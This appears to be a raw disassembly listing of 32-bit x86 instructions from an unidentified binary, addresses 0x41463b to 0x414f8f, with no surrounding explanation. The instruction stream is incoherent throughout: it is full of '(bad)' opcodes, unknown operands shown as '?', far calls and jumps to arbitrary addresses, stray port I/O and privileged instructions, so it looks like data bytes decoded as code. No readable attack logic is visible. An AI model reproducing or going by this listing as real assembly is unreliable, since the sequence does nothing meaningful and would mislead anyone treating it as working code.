  41463b:	sub    al,0xa7
  41463d:	dec    ebp
  41463e:	pop    esp
  41463f:	cmp    al,0x3
  414641:	dec    esp
  414642:	inc    eax
  414643:	and    edi,esi
  414645:	lds    edi,FWORD PTR [edi-0x5]
  414648:	xchg   ebx,eax
  414649:	mov    edx,0xc8b54bd3
  41464e:	ret    
  41464f:	ds jbe 0x414664
  414652:	push   ss
  414653:	ret    
  414654:	sar    BYTE PTR [esi],1
  414656:	mov    es,WORD PTR [esi]
  414658:	int    0x80
  41465a:	fs jmp 0x45ceb2f7
  414660:	dec    esp
  414661:	mov    esi,0x64db303d
  414666:	lods   eax,DWORD PTR ds:[esi]
  414667:	push   edi
  414668:	outs   dx,BYTE PTR ds:[esi]
  414669:	xor    eax,0x3a7abb75
  41466e:	add    ch,BYTE PTR [eax]
  414670:	nop
  414671:	and    edi,esi
  414673:	lock dec esp
  414675:	rol    DWORD PTR [edx+0x317e13d8],0x90
  41467c:	ret    
  41467d:	xor    edx,DWORD PTR [ebp+ebx*8+0x6d]
  414681:	aam    0x66
  414683:	daa    
  414684:	dec    edi
  414685:	iret   
  414686:	or     al,0x93
  414688:	lea    edx,[ebx]
  41468a:	js     0x4146c1
  41468c:	xabort 0xd9
  41468f:	adc    al,0x3c
  414691:	add    BYTE PTR [edi+0x325a2a9d],0xa5
  414698:	gs push edi
  41469a:	ds sbb al,0xb3
  41469d:	xchg   ebp,eax
  41469e:	cld    
  41469f:	lods   al,BYTE PTR ds:[esi]
  4146a0:	repnz xor al,0x73
  4146a3:	xor    BYTE PTR [edi-0x3e],0x79
  4146a7:	out    0x1c,al
  4146a9:	mov    cl,0xb3
  4146ab:	mov    bh,0x8a
  4146ad:	adc    ch,dh
  4146af:	push   cs
  4146b0:	mov    ch,0x16
  4146b2:	inc    esp
  4146b3:	pop    ebx
  4146b4:	call   0xa2c:0x8f024293
  4146bb:	lahf   
  4146bc:	out    dx,eax
  4146bd:	xchg   ecx,eax
  4146be:	ret    
  4146bf:	mov    edx,0x24116bea
  4146c4:	lock scas eax,DWORD PTR es:[edi]
  4146c6:	add    eax,0x14f168bf
  4146cb:	pop    ebp
  4146cc:	iret   
  4146cd:	outs   dx,DWORD PTR ds:[esi]
  4146ce:	and    esi,edi
  4146d0:	rcr    BYTE PTR [esi-0x21],cl
  4146d3:	cwde   
  4146d4:	mov    esi,0x658d4a3e
  4146d9:	push   esp
  4146da:	pop    eax
  4146db:	xchg   ecx,eax
  4146dc:	push   cs
  4146dd:	dec    edx
  4146de:	lods   al,BYTE PTR ds:[esi]
  4146df:	mov    al,ds:0x8f1a5496
  4146e4:	sbb    eax,0xab134e7b
  4146e9:	pop    ss
  4146ea:	pop    ecx
  4146eb:	ret    
  4146ec:	mov    DWORD PTR [eax],eax
  4146ee:	es mov dh,0xe4
  4146f1:	push   0xe60de6da
  4146f6:	push   edi
  4146f7:	jno    0x41476b
  4146f9:	xchg   ebp,eax
  4146fa:	sub    al,0x97
  4146fc:	cmp    dh,dl
  4146fe:	mov    edx,edx
  414700:	daa    
  414701:	pop    es
  414702:	fwait
  414703:	mov    al,0xaa
  414705:	add    eax,DWORD PTR [eax+esi*4]
  414708:	sbb    al,0x23
  41470a:	mov    al,ds:0x576adf0f
  41470f:	dec    eax
  414710:	call   0x454c:0xeab332ee
  414717:	mov    ah,0xdb
  414719:	push   0x60
  41471b:	push   es
  41471c:	sub    al,0x7e
  41471e:	mov    eax,ds:0x2856d3d
  414723:	inc    ebp
  414724:	gs and dl,ch
  414727:	push   eax
  414728:	aad    0x18
  41472a:	mov    edx,0xcd65a17
  41472f:	push   ecx
  414730:	stos   DWORD PTR es:[edi],eax
  414731:	mov    ebp,0x772e80a0
  414736:	rcl    DWORD PTR [edi+0x28e6ce4],cl
  41473c:	cwde   
  41473d:	xor    ecx,ecx
  41473f:	xor    dh,BYTE PTR [edi+0x74]
  414742:	pop    edx
  414743:	xchg   BYTE PTR [ecx+0x64],cl
  414746:	outs   dx,DWORD PTR ds:[esi]
  414747:	outs   dx,DWORD PTR ds:[esi]
  414748:	aam    0x2b
  41474a:	out    0x38,eax
  41474c:	dec    ebp
  41474d:	cs push es
  41474f:	or     edx,DWORD PTR [ebx+0x19]
  414752:	call   0xf9b07320
  414757:	arpl   WORD PTR [ebx],si
  414759:	mov    eax,0x7da0d4fd
  41475e:	enter  0x563c,0x16
  414762:	clc    
  414763:	cld    
  414764:	int3   
  414765:	jmp    0x4147b0
  414767:	dec    ecx
  414768:	dec    ecx
  414769:	pop    esi
  41476a:	fsubp  st(3),st
  41476c:	ins    DWORD PTR es:[edi],dx
  41476d:	cwde   
  41476e:	ss stos BYTE PTR es:[edi],al
  414770:	outs   dx,BYTE PTR ds:[esi]
  414771:	jge    0x41472d
  414773:	test   al,0x65
  414775:	test   DWORD PTR [esi-0x38c70097],esi
  41477b:	clc    
  41477c:	mov    bh,0x7a
  41477e:	std    
  41477f:	rcr    DWORD PTR [edx+0x45],0xcc
  414783:	in     eax,0x62
  414785:	sub    BYTE PTR [edi+esi*2],0x50
  414789:	jecxz  0x4147da
  41478b:	jp     0x414738
  41478d:	cdq    
  41478e:	sbb    BYTE PTR [edi-0x4015b6bd],bl
  414794:	or     DWORD PTR [esi+0x5c],esp
  414797:	ret    
  414798:	jne    0x4147ad
  41479a:	lds    edi,FWORD PTR [edx-0x4b195338]
  4147a0:	and    DWORD PTR [esi-0x5f],ecx
  4147a3:	iret   
  4147a4:	sub    edi,edi
  4147a6:	mov    ebp,0x78dad63b
  4147ab:	call   0xf3e76f5
  4147b0:	or     eax,0x86f1c865
  4147b5:	jmp    0x41479e
  4147b7:	dec    eax
  4147b8:	sti    
  4147b9:	popa   
  4147ba:	retf   
  4147bb:	loope  0x414813
  4147bd:	mov    edx,0x2598d8ad
  4147c2:	ins    DWORD PTR es:[edi],dx
  4147c3:	call   0x22b:0x9a4e8be4
  4147ca:	stos   BYTE PTR es:[edi],al
  4147cb:	pop    esp
  4147cc:	outs   dx,DWORD PTR ds:[esi]
  4147cd:	jecxz  0x414760
  4147cf:	dec    ebp
  4147d0:	test   BYTE PTR [eax],0x2e
  4147d3:	(bad)  
  4147d4:	mov    WORD PTR [edx+0x35],fs
  4147d7:	xchg   ebp,eax
  4147d8:	push   ds
  4147d9:	(bad)  
  4147da:	lahf   
  4147db:	sbb    eax,0xcedc6c7
  4147e0:	jecxz  0x414801
  4147e2:	mov    esp,0xc2016d07
  4147e7:	fdiv   DWORD PTR [ebp+0x6ba30366]
  4147ed:	(bad)  
  4147ee:	xchg   ecx,eax
  4147ef:	xor    DWORD PTR [ecx],esp
  4147f1:	in     al,0x93
  4147f3:	sbb    DWORD PTR [ecx],edx
  4147f5:	int3   
  4147f6:	or     al,0xc3
  4147f8:	out    0x98,al
  4147fa:	lahf   
  4147fb:	in     eax,dx
  4147fc:	rcr    BYTE PTR [ecx],1
  4147fe:	ret    0x38cb
  414801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414802:	pop    ebx
  414803:	sub    DWORD PTR [ecx+ebp*1+0x6249e8d2],ebp
  41480a:	int3   
  41480b:	xor    eax,0xc28b28ce
  414810:	out    dx,al
  414811:	push   edx
  414812:	inc    esp
  414813:	jmp    0x9d5867be
  414818:	jno    0x41481c
  41481a:	cmp    esi,edx
  41481c:	in     eax,0xd3
  41481e:	pop    ss
  41481f:	xchg   edi,eax
  414820:	cmp    BYTE PTR [edx-0x74a66e54],al
  414826:	xchg   ebx,eax
  414827:	stos   DWORD PTR es:[edi],eax
  414828:	fs sahf 
	...
  4149f6:	jecxz  0x4149fe
  4149f8:	add    DWORD PTR [edi-0x1b],esi
  4149fb:	ja     0x4149f4
  4149fd:	xchg   esi,eax
  4149fe:	popf   
  4149ff:	mov    edx,0xfac7c648
  414a04:	sub    al,0x2
  414a06:	jge    0x4149b0
  414a08:	add    DWORD PTR [eax],eax
  414a0a:	push   ds
  414a0b:	pop    es
  414a0c:	add    BYTE PTR [eax],al
  414a0e:	cdq    
  414a0f:	mov    edi,0xc69d42ed
  414a14:	inc    esp
  414a15:	popf   
  414a16:	lea    ecx,[ebx+eax*2+0x6b1cf87e]
  414a1d:	mov    gs,WORD PTR [ebx+eax*1+0x4b]
  414a21:	fs pop ebx
  414a23:	clc    
  414a24:	sub    DWORD PTR [ebx+0x161c8744],edi
  414a2a:	mov    eax,ds:0xe926606f
  414a2f:	jne    0x414a20
  414a31:	pushf  
  414a32:	loopne 0x414a17
  414a34:	and    ch,BYTE PTR [ecx+eax*8]
  414a37:	mov    ah,0xfc
  414a39:	out    dx,eax
  414a3a:	dec    esi
  414a3b:	dec    eax
  414a3c:	cmp    BYTE PTR [ecx],cl
  414a3e:	push   esi
  414a3f:	inc    eax
  414a40:	adc    DWORD PTR [ebx],0x28d411ba
  414a46:	aas    
  414a47:	cmp    esi,0xffffffe6
  414a4a:	xor    DWORD PTR [esi],edx
  414a4c:	xor    eax,0xcb91edbb
  414a51:	xlat   BYTE PTR ds:[ebx]
  414a52:	mov    esi,0xa7c1924a
  414a57:	push   cs
  414a58:	mov    esi,0x43de5ea7
  414a5d:	adc    DWORD PTR [esi],ecx
  414a5f:	arpl   WORD PTR [esi],dx
  414a61:	sti    
  414a62:	sti    
  414a63:	inc    esi
  414a64:	xchg   esp,eax
  414a65:	test   eax,0x9fa3383d
  414a6a:	(bad)  
  414a6b:	fidiv  DWORD PTR gs:[esi+0x65]
  414a6f:	rol    BYTE PTR [ebp+0x74],cl
  414a72:	popf   
  414a73:	mov    edi,0xc0772c93
  414a78:	test   eax,0x52383146
  414a7d:	sub    al,0x58
  414a7f:	addr16 push edx
  414a81:	dec    edx
  414a82:	cwde   
  414a83:	hlt    
  414a84:	and    eax,0xec492fc9
  414a89:	popf   
  414a8a:	cs or  DWORD PTR ss:0xae74724f,eax
  414a92:	mov    bh,0xf7
  414a94:	retf   0xf2a6
  414a97:	lock mov ah,0x20
  414a9a:	jae    0x414a9a
  414a9c:	test   al,0x94
  414a9e:	dec    ebp
  414a9f:	aaa    
  414aa0:	ins    DWORD PTR es:[edi],dx
  414aa1:	call   0xd0248e2c
  414aa6:	in     al,dx
  414aa7:	mov    ah,0xed
  414aa9:	dec    ecx
  414aaa:	add    ch,BYTE PTR [edi]
  414aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aad:	mov    bh,0xbe
  414aaf:	xchg   edx,eax
  414ab0:	fsubr  QWORD PTR [edi+0x41]
  414ab3:	mov    edx,0xdf744d1d
  414ab8:	jns    0x414b0b
  414aba:	mov    edx,0x1af9e247
  414abf:	inc    edi
  414ac0:	or     al,0xc2
  414ac2:	mov    WORD PTR [ecx+0x5f],?
  414ac5:	mov    dh,0x78
  414ac7:	test   BYTE PTR [edi+edi*8-0x7ba9e0fe],cl
  414ace:	jge    0x414b23
  414ad0:	sbb    al,0x92
  414ad2:	adc    BYTE PTR [eax+0x4e1e6dcc],bl
  414ad8:	jo     0x414a90
  414ada:	out    dx,eax
  414adb:	pop    ecx
  414adc:	je     0x414af6
  414ade:	jnp    0x414b29
  414ae0:	loope  0x414b55
  414ae2:	mov    BYTE PTR [edx-0x597b9e22],cl
  414ae8:	hlt    
  414ae9:	mov    WORD PTR ds:0x2a50b6ee,cs
  414aef:	xchg   BYTE PTR [edi],ah
  414af1:	add    DWORD PTR [ebx-0x17],edx
  414af4:	in     al,0xad
  414af6:	dec    esp
  414af7:	repz lahf 
  414af9:	sbb    al,0x47
  414afb:	aam    0xaf
  414afd:	jp     0x414aee
  414aff:	and    DWORD PTR [ecx],eax
  414b01:	gs pop edx
  414b03:	rol    BYTE PTR [eax-0x54],0x92
  414b07:	jbe    0x414aa0
  414b09:	pop    eax
  414b0a:	mov    ch,0xd5
  414b0c:	fwait
  414b0d:	test   DWORD PTR [edx+ebp*4],0x634ef712
  414b14:	scas   eax,DWORD PTR es:[edi]
  414b15:	lods   al,BYTE PTR ds:[esi]
  414b16:	cdq    
  414b17:	or     DWORD PTR ds:0xb0694b98,esi
  414b1d:	fld    QWORD PTR [ecx]
  414b1f:	fdivrp st(2),st
  414b21:	mov    ah,0x54
  414b23:	xchg   ebx,eax
  414b24:	mov    edi,DWORD PTR [edi+0x45]
  414b27:	push   esp
  414b28:	or     al,0x9a
  414b2a:	push   esp
  414b2b:	mov    bl,0xab
  414b2d:	sahf   
  414b2e:	jp     0x414b3e
  414b30:	out    dx,eax
  414b31:	mov    ecx,0x1c5481d9
  414b36:	sub    esp,DWORD PTR [ebx+0x7e]
  414b39:	data16 jle 0x414b81
  414b3c:	xlat   BYTE PTR ds:[ebx]
  414b3d:	cmp    edi,DWORD PTR [eax]
  414b3f:	dec    esi
  414b40:	mov    al,ds:0xf2960c61
  414b45:	push   ds
  414b46:	xchg   esp,eax
  414b47:	xlat   BYTE PTR ds:[ebx]
  414b48:	std    
  414b49:	in     eax,dx
  414b4a:	pop    ebp
  414b4b:	sbb    BYTE PTR [ebx-0x288b5a01],ch
  414b51:	cli    
  414b52:	push   esi
  414b53:	hlt    
  414b54:	ss mov ebp,0x52f0cf65
  414b5a:	push   ecx
  414b5b:	adc    esi,ebp
  414b5d:	and    ebp,edx
  414b5f:	jo     0x414af8
  414b61:	add    DWORD PTR [edi-0x4b9401d3],0x81868000
  414b6b:	outs   dx,DWORD PTR ss:[esi]
  414b6d:	ror    bl,cl
  414b6f:	jnp    0x414bb4
  414b71:	mov    DWORD PTR [esi+0x53],ecx
  414b74:	adc    esp,DWORD PTR [eax+0x21]
  414b77:	mov    DWORD PTR [esi-0x73],0x4b488cb3
  414b7e:	int3   
  414b7f:	mov    eax,0xfd4ac4bc
  414b84:	mov    dl,0x2a
  414b86:	inc    edx
  414b87:	repz push ds
  414b89:	inc    ebx
  414b8a:	and    al,0x2
  414b8c:	and    eax,0x719405ae
  414b91:	mov    ah,0x57
  414b93:	popa   
  414b94:	cmp    eax,0xe7a6b7db
  414b99:	xor    BYTE PTR [ebx],dl
  414b9b:	fild   QWORD PTR [edx]
  414b9d:	(bad)  
  414b9e:	pop    edi
  414b9f:	ss stos DWORD PTR es:[edi],eax
  414ba1:	sub    ch,0x49
  414ba4:	mov    edi,0xa477c4f7
  414ba9:	add    ah,ah
  414bab:	jl     0x414c11
  414bad:	push   esp
  414bae:	jns    0x414b84
  414bb0:	out    0x7f,al
  414bb2:	ret    0xe0be
  414bb5:	cmp    esi,esi
  414bb7:	arpl   si,si
  414bb9:	ja     0x414bb0
  414bbb:	push   0x17f25cc
  414bc0:	(bad)  
  414bc1:	imul   ebx
  414bc3:	test   DWORD PTR [edi+0x4c7d53a6],esp
  414bc9:	scas   al,BYTE PTR es:[edi]
  414bca:	sub    DWORD PTR [edi+0x4a17ebd9],ebx
  414bd0:	adc    bh,dl
  414bd2:	dec    esp
  414bd4:	repnz dec eax
  414bd6:	cld    
  414bd7:	xchg   BYTE PTR [edx+0x4e7fa300],bh
  414bdd:	fisubr WORD PTR [ebp+0x1a1eb1e3]
  414be3:	push   es
  414be4:	dec    esi
  414be5:	dec    esp
  414be6:	mov    ebx,0x81b608c9
  414beb:	in     al,dx
  414bec:	popf   
  414bed:	fcomip st,st(3)
  414bef:	cmc    
  414bf0:	ficom  WORD PTR [edi+0x5e1f2b8c]
  414bf6:	(bad)  
  414bf7:	rcr    BYTE PTR [ecx+0xb410bbc],1
  414bfd:	loopne 0x414c72
  414bff:	pop    esi
  414c00:	out    dx,al
  414c01:	adc    cl,al
  414c03:	add    ebp,DWORD PTR [ebp-0x24]
  414c06:	inc    edx
  414c07:	xchg   ebp,eax
  414c08:	pop    esi
  414c09:	daa    
  414c0a:	lock pop ds
  414c0c:	in     al,dx
  414c0d:	add    eax,0xf93644ec
  414c12:	sub    esp,DWORD PTR [edx-0x3286ddb]
  414c18:	xor    BYTE PTR [ebx-0xc9737b],bh
  414c1e:	in     eax,dx
  414c1f:	push   0xd61035c1
  414c24:	lea    ecx,[esi+0x68]
  414c27:	inc    ebx
  414c28:	sub    DWORD PTR [edi-0x17e1dcd0],edi
  414c2e:	mov    dl,0xcb
  414c30:	fstp   TBYTE PTR [ebp-0xe]
  414c33:	shl    DWORD PTR [eax+eiz*1+0x5c],0xf2
  414c38:	ins    DWORD PTR es:[edi],dx
  414c39:	(bad)  
  414c3a:	jle    0x414c0a
  414c3c:	leave  
  414c3d:	xchg   edi,eax
  414c3e:	in     eax,dx
  414c3f:	and    eax,ecx
  414c41:	inc    eax
  414c42:	dec    ebp
  414c43:	jnp    0x414c8a
  414c45:	inc    esi
  414c46:	push   eax
  414c47:	lock adc DWORD PTR [edi+0x10],ebp
  414c4b:	out    0x11,al
  414c4d:	sar    edi,0xaf
  414c50:	sub    eax,DWORD PTR [edi]
  414c52:	cmp    edi,0xfa4e4aa8
  414c58:	cmp    edx,DWORD PTR [edi]
  414c5a:	sbb    DWORD PTR [edi+0x16],edi
  414c5d:	call   0x29e1c225
  414c62:	retf   
  414c63:	test   eax,0x5d1e7658
  414c68:	retf   0x4b44
  414c6b:	femms  
  414c6d:	add    eax,0x8585e296
  414c72:	imul   ebp,DWORD PTR [ebx-0x80],0x1cb63f8
  414c79:	sbb    BYTE PTR [ecx],dh
  414c7b:	sti    
  414c7c:	lahf   
  414c7d:	pushf  
  414c7e:	jb     0x414c64
  414c80:	mov    ecx,0xcc207597
  414c85:	fld    DWORD PTR [edi-0x169c2351]
  414c8b:	and    esi,edi
  414c8d:	mov    WORD PTR [ebx],ss
  414c8f:	std    
  414c90:	mov    ds:0xd6044553,al
  414c95:	push   esp
  414c96:	pop    ecx
  414c97:	out    dx,al
  414c98:	sub    eax,0xa9e5aaa4
  414c9d:	repnz rcl BYTE PTR [esi+0x7f80c6b0],cl
  414ca4:	pop    esp
  414ca5:	adc    ebp,DWORD PTR [ecx-0x69]
  414ca8:	ins    DWORD PTR es:[edi],dx
  414ca9:	mov    WORD PTR [esi],?
  414cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cac:	jae    0x414c89
  414cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414caf:	mov    edi,0xfb355982
  414cb4:	adc    al,0xe1
  414cb6:	in     eax,dx
  414cb7:	stos   BYTE PTR es:[edi],al
  414cb8:	pusha  
  414cb9:	neg    edi
  414cbb:	les    esp,FWORD PTR [ebx-0x7da69cd7]
  414cc1:	cmc    
  414cc2:	cmp    al,0x6a
  414cc4:	pop    ebp
  414cc5:	inc    ecx
  414cc6:	outs   dx,BYTE PTR ds:[esi]
  414cc7:	test   BYTE PTR [ecx],bl
  414cc9:	push   ebx
  414cca:	gs or  al,bl
  414ccd:	jo     0x414d07
  414ccf:	mov    esp,0x2237f798
  414cd4:	daa    
  414cd5:	pusha  
  414cd6:	gs loop 0x414d24
  414cd9:	inc    edx
  414cda:	in     eax,dx
  414cdb:	dec    edx
  414cdc:	lods   eax,DWORD PTR ds:[esi]
  414cdd:	or     BYTE PTR [ebp+0x29],al
  414ce0:	and    bl,BYTE PTR [ecx]
  414ce2:	sbb    eax,0xfa609933
  414ce7:	shl    DWORD PTR [edi],0x27
  414cea:	mov    ds:0xf4113813,al
  414cef:	inc    ecx
  414cf0:	dec    ebx
  414cf1:	mov    ah,0x62
  414cf3:	out    dx,al
  414cf4:	xlat   BYTE PTR ds:[ebx]
  414cf5:	mov    bh,0xdd
  414cf7:	jle    0x414cc4
  414cf9:	(bad)  
  414cfa:	in     eax,0xe4
  414cfc:	or     eax,0xce7227f
  414d01:	in     eax,0xc6
  414d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d04:	into   
  414d05:	loop   0x414cf5
  414d07:	ins    DWORD PTR es:[edi],dx
  414d08:	add    DWORD PTR [edx+0x41b760a],edx
  414d0e:	mov    esi,0xfa233af6
  414d13:	lea    ecx,[edx-0x1e]
  414d16:	inc    esi
  414d17:	retf   
  414d18:	call   0xae85:0x4ccd9b28
  414d1f:	push   esp
  414d20:	mov    al,BYTE PTR [ecx-0x38baa3cd]
  414d26:	sbb    edx,DWORD PTR [edi+0x5a]
  414d29:	pop    eax
  414d2a:	enter  0xfc36,0x57
  414d2e:	out    dx,eax
  414d2f:	enter  0x9b26,0x87
  414d33:	test   DWORD PTR [esi+eax*1+0xf],0x22d01a49
  414d3b:	mov    DWORD PTR [edi],edx
  414d3d:	ret    
  414d3e:	jb     0x414daa
  414d40:	out    0x37,al
  414d42:	jmp    0x5a45cf93
  414d47:	mov    bh,0xf3
  414d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d4a:	adc    al,0xe1
  414d4c:	and    al,BYTE PTR [edi+0x15]
  414d4f:	and    DWORD PTR [ecx],0x4a1dac1
  414d55:	mov    edx,DWORD PTR [ebx+0x2]
  414d58:	inc    ebp
  414d59:	inc    DWORD PTR [eax-0x185700d7]
  414d5f:	fstp   QWORD PTR [eax+0x38]
  414d62:	push   0xffffff83
  414d64:	sub    eax,0xf7992609
  414d69:	hlt    
  414d6a:	sub    al,0x3c
  414d6c:	mov    dl,0xb6
  414d6e:	push   esi
  414d6f:	into   
  414d70:	jne    0x414d81
  414d72:	loop   0x414d16
  414d74:	lea    ebp,[edi+esi*2]
  414d77:	test   al,0xf7
  414d79:	aad    0x3f
  414d7b:	inc    ebx
  414d7c:	push   ss
  414d7d:	or     dl,BYTE PTR [esi-0x57c08088]
  414d83:	dec    esi
  414d84:	fstp   QWORD PTR [ebx+ebp*1]
  414d87:	outs   dx,BYTE PTR ds:[esi]
  414d88:	pop    esp
  414d89:	dec    esi
  414d8a:	jnp    0x414dfa
  414d8c:	inc    eax
  414d8d:	gs sub dh,al
  414d90:	(bad)  
  414d91:	mov    ebx,0x4a861f93
  414d96:	mov    ch,0xe
  414d98:	mov    cl,0xdc
  414d9a:	pop    esi
  414d9b:	aad    0x7
  414d9d:	xor    eax,DWORD PTR [ebx]
  414d9f:	xor    ah,BYTE PTR [ecx+0x420b7190]
  414da5:	shl    DWORD PTR [esi-0x1f2574c9],cl
  414dab:	cmp    al,0x6d
  414dad:	mov    si,0x5a27
  414db1:	mov    al,0xa9
  414db3:	inc    ebp
  414db4:	(bad)  
  414db6:	adc    cl,0x34
  414db9:	shrd   edi,esi,0xb3
  414dbd:	fs sbb al,0x29
  414dc0:	ret    0x2bf2
  414dc3:	add    eax,0x4ec283c3
  414dc8:	scas   al,BYTE PTR es:[edi]
  414dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dca:	es mov ebx,0xdf6a6984
  414dd0:	sbb    eax,0xac8b1c0
  414dd5:	retf   0x251
  414dd8:	loope  0x414e02
  414dda:	pushf  
  414ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ddc:	sar    bl,0x65
  414ddf:	inc    ebp
  414de0:	add    cl,BYTE PTR [eax-0x29]
  414de3:	ds cmp al,0x43
  414de6:	push   eax
  414de7:	mov    esp,0xd6d03073
  414dec:	pop    esi
  414ded:	cmp    BYTE PTR [eax+0x290a4c96],ah
  414df3:	dec    esi
  414df4:	ins    BYTE PTR es:[edi],dx
  414df5:	imul   ecx,DWORD PTR ds:0x63bcfde6,0x73b7ecbf
  414dff:	push   eax
  414e00:	inc    ecx
  414e01:	bound  ecx,QWORD PTR [ebp-0x5f]
  414e04:	cmc    
  414e05:	push   edi
  414e06:	push   cs
  414e07:	scas   al,BYTE PTR es:[edi]
  414e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e09:	lahf   
  414e0a:	stos   BYTE PTR es:[edi],al
  414e0b:	push   esp
  414e0c:	imul   eax,DWORD PTR [ebx+eax*4+0x9],0x8
  414e11:	mov    esi,0x8dc50129
  414e16:	daa    
  414e17:	sbb    al,ah
  414e19:	arpl   WORD PTR [edx*2-0x21472bda],bp
  414e20:	fild   QWORD PTR [edx-0x56]
  414e23:	in     al,0xfb
  414e25:	xchg   esi,eax
  414e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e27:	or     bh,BYTE PTR [edx]
  414e29:	fwait
  414e2a:	sar    ebx,cl
  414e2c:	dec    edi
  414e2d:	adc    al,0xa9
  414e2f:	lods   eax,DWORD PTR ds:[esi]
  414e30:	adc    eax,0xbbee53c6
  414e35:	or     dh,bl
  414e37:	shl    BYTE PTR [esi-0x64],1
  414e3a:	mov    ecx,0x8d51205f
  414e3f:	sahf   
  414e40:	shr    BYTE PTR [ecx],0x5c
  414e43:	test   al,0x8f
  414e45:	dec    ebx
  414e46:	cmp    eax,0x9e9052b9
  414e4b:	jb     0x414ea3
  414e4d:	int    0xfe
  414e4f:	out    0x61,eax
  414e51:	and    ah,cl
  414e53:	shl    DWORD PTR [eax+0x47],0xd
  414e57:	dec    ebp
  414e58:	xchg   DWORD PTR [eax+0x4e76baac],ecx
  414e5e:	and    BYTE PTR [esi-0x75b28a2b],bl
  414e64:	mov    ecx,0x9ac24b40
  414e69:	xchg   DWORD PTR [ecx],edx
  414e6b:	iret   
  414e6c:	push   ecx
  414e6d:	cmp    eax,0xfac128c1
  414e72:	push   esp
  414e73:	leave  
  414e74:	outs   dx,BYTE PTR ds:[esi]
  414e75:	sahf   
  414e76:	jb     0x414e90
  414e78:	mov    al,ds:0x3dcdc74
  414e7d:	je     0x414ebc
  414e7f:	jge    0x414ea0
  414e81:	out    dx,eax
  414e82:	sub    al,0x4
  414e84:	enter  0x7a60,0x96
  414e88:	inc    ecx
  414e89:	mov    al,ds:0xabf083dc
  414e8e:	lock jmp 0x6a37797a
  414e94:	push   eax
  414e95:	cmp    al,0x3e
  414e97:	pop    esi
  414e98:	enter  0x17c2,0x8
  414e9c:	push   ebp
  414e9d:	cli    
  414e9e:	xor    eax,0xdf30a254
  414ea3:	sub    al,0x14
  414ea5:	sub    DWORD PTR [eax+esi*8+0x1cb6540e],ebp
  414eac:	repnz cwde 
  414eae:	push   ebx
  414eaf:	shr    ah,cl
  414eb1:	out    0xbe,al
  414eb3:	push   esp
  414eb4:	repz sub al,0xce
  414eb7:	rol    BYTE PTR [ebp-0x3],cl
  414eba:	fnsave [ebp+0x1b]
  414ebd:	cld    
  414ebe:	add    al,0xb
  414ec0:	push   ebp
  414ec1:	mov    bl,0x27
  414ec3:	(bad)  
  414ec5:	xchg   edx,eax
  414ec6:	and    eax,0x2d44dfcf
  414ecb:	add    edx,DWORD PTR [ecx+0x4c]
  414ece:	clc    
  414ecf:	leave  
  414ed0:	fcomp  st(5)
  414ed2:	inc    ebp
  414ed3:	dec    eax
  414ed4:	scas   al,BYTE PTR es:[edi]
  414ed5:	dec    ebx
  414ed6:	push   es
  414ed7:	xchg   edx,eax
  414ed8:	test   DWORD PTR [edi+0x592ed5b9],ebx
  414ede:	jp     0x414ee8
  414ee0:	shr    DWORD PTR [ebx-0x4c],1
  414ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ee4:	fdivr  st,st(7)
  414ee6:	adc    eax,0x55f11052
  414eeb:	out    dx,eax
  414eec:	or     bh,BYTE PTR [esi+eax*1-0xfb76a25]
  414ef3:	ins    BYTE PTR es:[edi],dx
  414ef4:	(bad)  
  414ef6:	or     DWORD PTR [ecx+0x4b],ebp
  414ef9:	enter  0x6055,0x98
  414efd:	add    edi,DWORD PTR [edi]
  414eff:	mov    dl,dl
  414f01:	fcom   st(3)
  414f03:	xchg   ebx,eax
  414f04:	jp     0x414e94
  414f06:	lds    ebx,FWORD PTR [esi-0x13baac5d]
  414f0c:	adc    al,0xa5
  414f0e:	adc    dl,al
  414f10:	ret    
  414f11:	mov    BYTE PTR [esi-0x23e96e7c],al
  414f17:	js     0x414f7a
  414f19:	xchg   edx,eax
  414f1a:	ins    DWORD PTR es:[edi],dx
  414f1b:	xor    eax,0xa7dfcbe2
  414f20:	pop    ebp
  414f21:	test   al,0xce
  414f23:	idiv   BYTE PTR [edi+0xc727de6]
  414f29:	ja     0x414f2f
  414f2b:	sbb    eax,0x4b09eca8
  414f30:	inc    ebp
  414f31:	dec    esi
  414f32:	sbb    DWORD PTR [eax-0x58],ebp
  414f35:	and    edx,DWORD PTR [edx-0x4d]
  414f38:	lds    esp,FWORD PTR [ecx]
  414f3a:	stc    
  414f3b:	cmp    DWORD PTR [ebx+0x52],ebx
  414f3e:	in     al,dx
  414f3f:	les    ecx,FWORD PTR ds:0x47b7764a
  414f45:	cdq    
  414f46:	pop    edi
  414f47:	test   eax,0x6eb88c70
  414f4c:	ins    DWORD PTR es:[edi],dx
  414f4d:	xchg   BYTE PTR [edx],ch
  414f4f:	xchg   ebx,eax
  414f50:	arpl   WORD PTR [ecx-0x61],cx
  414f53:	stos   DWORD PTR es:[edi],eax
  414f54:	in     eax,dx
  414f55:	sub    esi,esi
  414f57:	test   al,0x9c
  414f59:	jne    0x414fb8
  414f5b:	(bad)  
  414f5c:	cmp    al,0x8e
  414f5e:	mov    bh,0xcd
  414f60:	cmp    dl,BYTE PTR [esi+0x11bf8c62]
  414f66:	push   esi
  414f67:	push   ebp
  414f68:	adc    ebx,DWORD PTR [ebx+0x63]
  414f6b:	mov    al,0xb7
  414f6d:	loope  0x414f3a
  414f6f:	jmp    0x2b5a:0x28d8d932
  414f76:	mov    cl,0x66
  414f78:	jo     0x414efd
  414f7a:	cmp    dl,BYTE PTR [ecx]
  414f7c:	xchg   edi,eax
  414f7d:	and    edx,ecx
  414f7f:	cdq    
  414f80:	inc    edi
  414f81:	adc    eax,0x4e0633b
  414f86:	sbb    BYTE PTR [esi],dl
  414f88:	pop    edx
  414f89:	mov    ah,0xe3
  414f8b:	sub    BYTE PTR [ebp-0x5e],bl
  414f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f8f:	shr    BYTE PTR [edx+0x75],1
